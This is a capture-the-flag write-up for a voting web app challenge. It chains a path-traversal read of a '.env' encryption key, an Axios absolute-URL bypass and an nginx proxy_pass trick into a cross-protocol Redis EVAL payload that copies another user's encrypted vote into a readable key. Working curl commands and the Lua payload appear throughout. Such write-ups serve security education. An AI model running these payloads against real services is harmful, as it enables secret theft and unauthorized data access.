# Week 3 - Following Protocol
For this challenge, we're provided with the source code to a voting web app and asked to find out who the user "wbc" has voted for. The source contains a Docker compose file and several different apps, tied together with a front end Node app that we're given the URL for.
### Examining the Source
Inside the `restore.sh` file for the redis container we can see our target data, a redis field for the wbc user with a `certifier`, which is redacted, and `voted_for` data. Looking at the code for the `python-backend`, we can see that the `voted_for` is encrypted before being stored, and the `certifier` forms part of the encryption key for the data. So our objective is to obtain the `certifier` and the `base_key` value to obtain the encryption key for the `voted_for` data. To interact with these backend services, we need to use the `/api/*` endpoint in the front end Node application. We can direct requests to different services using the `v1`, `v2`, and `img` prefixes.
### Obtaining the Certifier and Base Key
This part should be fairly simple. The Python backend app on the `v2` service ha a `/certificate` endpoint that allows us to obtain a PDF file containing the certifier for any user. A simple request to this endpoint should be all that's needed for this step.
```shell
$ curl http://192.168.1.1:8000/api/v2/certificate -H "Content-Type: application/x-www-form-urlencoded" -d "name=wbc" > wbc_certifier.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2226  100  2218  100     8  21137     76 --:--:-- --:--:-- --:--:-- 21403
```
If we open up our PDF we find that we now have the "Certification Code" for our wbc user. Next is our base key. If we look at the certificate endpoint again, you might notice that the name provided is used for the output path with no validation or traversal detection. In the Dockerfile for the Python backend, we can see that the base key is stored in the `/app/.env` filepath. We can use this information to obtain the key from that file.
```shell
$ curl http://192.168.1.1:8000/api/v2/certificate -H "Content-Type: application/x-www-form-urlencoded" -d "name=../.env"                
ENCRYPTION_KEY=66616b656b6579736f727279
```
Though the application tries to write a PDF to that path, there's a check to catch if the file already exists, preventing the app from producing an error.
### ~~Decrypting~~ Finding the Data
Now we have our full decryption key, we can decrypt the data in the `restore.sh` by reversing the encryption function in the Python backend.
```python
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

encrypted_vote = base64.b64decode('dGhpc2hhc2JlZW5yZWRhY3RlZGZvcnlvdSxnb2ZpbmR0aGVyZWFsdmFsdWVub3ch')
certifier = 'Ak4gHIGV'
base_key = '66616b656b6579736f727279'

def decrypt_value(key: bytes, value: bytes) -> bytes:
    backend = default_backend()
    iv = value[:16]
    data = value[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    return decryptor.update(data) + decryptor.finalize()

key = (certifier + base_key).encode()
print(decrypt_value(key, encrypted_vote).decode())
```
Oh dear, that didn't work. If we actually decode the Base64 we've been given into text we can see that there's a bit more to this challenge yet. ```
```shell
$ base64 -D
dGhpc2hhc2JlZW5yZWRhY3RlZGZvcnlvdSxnb2ZpbmR0aGVyZWFsdmFsdWVub3ch
thishasbeenredactedforyou,gofindtherealvaluenow!
```
So our final task is to obtain the `voted_for` data from the redis server.
### Talking to Redis
To have any chance of fetching the data out, we need to find a way to talk to the redis server. None of our backend servers offer functions to fetch the `voted_for`, with the only reads performed being the `certifier` for the certificate endpoint, and the `img:*` keys in the nginx config. Calls to the image API must contain only digits otherwise we're given a 404 so this is unlikely to be of any help. Helpfully, the nginx `proxy_pass` setting is configured in a way where we can take advantage and modify the recieving location to wherever we like. On the node front end, the `allowAbsoluteUrls` setting on the Axios client has been set to false, which normally would prevent us from overriding the base URL. In this case however, the app is using Axios version 1.8.1, which contains a [vulnerability causing this setting to be ignored](https://github.com/axios/axios/issues/6806). This allows us to craft our own URL strings to send to the nginx backend. The redis server has been setup to disable TCP connections, but the socket is available and has been mounted to the nginx container for the image API. nginx does allow connections to Unix sockets via the `proxy_pass` setting, so this is what we'll use to talk to redis. To connect to the socket our URL will look like this:
```shell
$ curl -X HGET http://192.168.1.1:8000/api/test/http://nginx/unix:%2Fredis%2Fredis.sock:wbc%20voted_for
Request failed with status code 502
```
Unfortunately it's going to be slightly more complicated than this. There's two things we have to deal with when creating our call. The first is the extra data at the end of the URL, the `.backend.wbc/$2` part of the `proxy_pass` config. The second is a security feature in redis.
### Crafting a Payload
This is where we need to get a little bit creative. While we can connect to redis using nginx, we're unable to read a response as we will always receive a 502 error. If you launch a local version of the challenge and look at the redis logs you'll see the following message:
```
Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.`
```
Cross Protocol Scripting is exactly what we're trying to do here. While we can modify the HTTP call to use a verb other than `POST`, we can't stop nginx from sending the `Host` header, so redis will detect this and close the connection. This causes nginx to return the 502 response. While there may be a method to manipulate the redis output so nginx returns a successful response, I decided to use a different method. Before detecting the host header, redis will execute the command given on the initial line containing our HTTP verb and path. We also have an endpoint where we have some limited control over the key we fetch from redis, that being the image service. So our goal is to: fetch the data from the `wbc voted_for` key, and store it in an `img:*` key for us to fetch. We can do this using the `EVAL` command in redis, which executes a lua script in a sandboxed environment. Our lua script will look like this:
```lua
local b = redis.call('hget', 'wbc', 'voted_for'); 
redis.call('set', 'img:678', b);
```
We also need to deal with the `.backend.wbc/$2` part of our URL, as well as the HTTP version suffix of the request. The `EVAL` command requires you to specify the number of arguments you are providing for the script, and although we haven't used any arguments, we can still tell redis that these two pieces are arguments for our script, completing our payload and executing our command. We also need to add a trailing slash to the URL to ensure we're matching the nginx location regex.
```shell
$ curl -X EVAL http://192.168.1.1:8000/api/test/http://nginx/unix:%2Fredis%2Fredis.sock:%22local%20b%20%3D%20redis.call%28%27hget%27%2C%20%27wbc%27%2C%20%27voted_for%27%29%3B%20redis.call%28%27set%27%2C%20%27img%3A678%27%2C%20b%29%3B%22%202%20/
Request failed with status code 502
```
This is the command redis will receive from nginx as a result of this this request.
```redis
EVAL "local b = redis.call('hget', 'wbc', 'voted_for'); redis.call('set', 'img:678', b);" 2 .backend.wbc/ HTTP/1.0
```
Finally we need to grab the data from our chosen image key.
```shell
$ curl http://192.168.1.1:8000/api/img/678
Y3lzZWF7dGhpc2lzbid0dGhlcmVhbGRhdGFlaXRoZXJzb3JyeSF9
```
 Now we just need to use this data in our previous decryption script and get the flag!